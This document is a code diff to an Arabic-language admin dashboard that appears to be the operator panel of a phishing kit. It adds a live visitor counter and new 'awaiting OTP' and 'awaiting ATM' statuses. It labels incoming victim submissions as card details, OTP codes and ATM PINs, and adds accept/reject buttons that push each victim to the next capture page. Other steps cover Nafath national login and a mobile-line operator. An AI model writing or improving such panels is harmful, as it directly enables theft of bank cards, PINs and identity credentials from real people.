@@ -60,8 +60,9 @@
     .main-wrap { max-width: 1280px; margin: 0 auto; padding: 24px 20px; }
 
     /* ===== Stats ===== */
-    .stats-row { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; margin-bottom: 24px; }
-    @media(max-width:768px){ .stats-row { grid-template-columns: repeat(2,1fr); } }
+    .stats-row { display: grid; grid-template-columns: repeat(5,1fr); gap: 16px; margin-bottom: 24px; }
+    @media(max-width:900px){ .stats-row { grid-template-columns: repeat(3,1fr); } }
+    @media(max-width:600px){ .stats-row { grid-template-columns: repeat(2,1fr); } }
     .stat-card {
       background: #fff; border-radius: 12px; padding: 18px;
       box-shadow: 0 1px 3px rgba(0,0,0,0.06);
@@ -74,6 +75,7 @@
     .s-new .stat-val { color: #2563eb; } .s-new .stat-ico { background: #eff6ff; color: #2563eb; }
     .s-done .stat-val { color: #16a34a; } .s-done .stat-ico { background: #f0fdf4; color: #16a34a; }
     .s-pend .stat-val { color: #d97706; } .s-pend .stat-ico { background: #fffbeb; color: #d97706; }
+    .s-online .stat-val { color: #0891b2; } .s-online .stat-ico { background: #ecfeff; color: #0891b2; }
 
     /* ===== Table Card ===== */
     .tbl-card { background: #fff; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); overflow: hidden; }
@@ -346,6 +348,10 @@
         <div><div class="stat-label">قيد المعالجة</div><div class="stat-val" id="sPend">0</div></div>
         <div class="stat-ico"><i class="bi bi-clock"></i></div>
       </div>
+      <div class="stat-card s-online">
+        <div><div class="stat-label">زوار متصلون الآن</div><div class="stat-val" id="sOnline">0</div></div>
+        <div class="stat-ico"><i class="bi bi-wifi"></i></div>
+      </div>
     </div>
 
     <!-- Table -->
@@ -398,6 +404,8 @@
   const STATUS = {
     new: { lbl:"جديد", cls:"b-new" },
     pending_payment: { lbl:"انتظار دفع", cls:"b-pending_payment" },
+    pending_otp: { lbl:"انتظار OTP", cls:"b-pending_payment" },
+    pending_atm: { lbl:"انتظار ATM", cls:"b-pending_payment" },
     pending_nafath: { lbl:"انتظار نفاذ", cls:"b-pending_nafath" },
     pending_motasel: { lbl:"انتظار متصل", cls:"b-pending_motasel" },
     payment_done: { lbl:"تم الدفع", cls:"b-payment_done" },
@@ -577,12 +585,14 @@
 
   /* ===== قبول/رفض الدفع ===== */
   async function paymentAction(ref, action) {
-    const btn = document.getElementById(`pay-${action}-${ref}`);
-    if (btn) { btn.disabled = true; btn.textContent = 'جاري...'; }
+    const passBtn = document.getElementById(`pay-pass-${ref}`);
+    const denyBtn = document.getElementById(`pay-denied-${ref}`);
+    // تعطيل كلا الزرين وإظهار 'جاري...'
+    if (passBtn) { passBtn.disabled = true; passBtn.textContent = 'جاري...'; }
+    if (denyBtn) { denyBtn.disabled = true; denyBtn.textContent = 'جاري...'; }
     try {
       const d = await post("/api/admin/payment-action", { reference: ref, action });
       if (d.success) {
-        const stepLabels = { 1: 'بطاقة → OTP', 2: 'OTP → ATM', 3: 'ATM → مشغل الخط' };
         const actionLabel = action === 'pass' ? '✅ قبول' : '❌ رفض';
         toast(`${actionLabel} - الخطوة ${d.currentStep}: تم توجيه العميل إلى ${d.targetPage}`, action==='pass'?'ok':'err');
         // تحديث معلومات الخطوة في النافذة
@@ -593,13 +603,21 @@
           stepInfo.textContent = `الخطوة الحالية: ${stepNames[nextStep]||'مكتملة'} | آخر إجراء: ${actionLabel} → ${d.targetPage}`;
         }
         loadAll();
+        // إعادة تحميل التفاصيل تلقائياً لتحديث الأزرار بدون إغلاق النافذة
+        if (currentOpenRef && currentOpenRef === ref) {
+          setTimeout(() => openDetail(ref), 600);
+        }
       } else {
         toast('فشل الإجراء: ' + (d.error||''), 'err');
-        if (btn) { btn.disabled = false; btn.innerHTML = action==='pass' ? '<i class="bi bi-check-circle-fill"></i> قبول' : '<i class="bi bi-x-circle-fill"></i> رفض'; }
+        // إعادة تفعيل الأزرار عند الفشل
+        if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+        if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
       }
     } catch(e) {
       toast('خطأ في الاتصال', 'err');
-      if (btn) { btn.disabled = false; btn.innerHTML = action==='pass' ? '<i class="bi bi-check-circle-fill"></i> قبول' : '<i class="bi bi-x-circle-fill"></i> رفض'; }
+      // إعادة تفعيل الأزرار عند الخطأ
+      if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+      if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
     }
   }
 
@@ -788,12 +806,18 @@
       loadAll();
     });
     sock.on("newPayment", (d) => {
-      beep(); toast(`بيانات دفع جديدة: ${d.reference}`,"inf");
+      const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
+      const stepLabel = d.step ? ` (${stepNames[d.step]||'خطوة '+d.step})` : '';
+      beep(); toast(`بيانات دفع جديدة: ${d.reference}${stepLabel}`,"inf");
       loadAll();
       // إذا كانت نافذة التفاصيل مفتوحة لنفس الـ reference، أعد تحميلها تلقائياً
       if (currentOpenRef && currentOpenRef === d.reference) {
         setTimeout(() => openDetail(d.reference), 500);
       }
+    });
+    sock.on("visitorsCount", (d) => {
+      const el = document.getElementById("sOnline");
+      if (el) el.textContent = d.count || 0;
     });
   }
 
